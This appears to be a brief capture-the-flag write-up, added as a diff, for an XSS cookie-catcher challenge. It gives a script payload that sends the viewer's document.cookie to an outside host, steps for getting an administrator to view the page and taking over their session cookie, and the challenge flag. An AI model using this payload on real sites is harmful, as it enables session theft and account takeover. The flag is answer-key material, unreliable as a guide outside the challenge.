@@ -1,0 +1,15 @@
+This is an XSS cookie-catcher challenge
+Create a page with the Javascript redirect payload
+
+
+```
+<script>new Image().src="http://johnhammond.org/?cookie="+encodeURI(document.cookie);</script>
+```
+
+And then view the page, and "report it" so an administrator or moderator will view it. Then check the cookie log and set your PHPSESSID cookie to that of the admins.
+
+Then view the page that they say is the valuable page
+43440b22864b30a0098f034eaf940730ca211a55
+
+and get the flag
+wow_cross_site_scripting_is_such_web
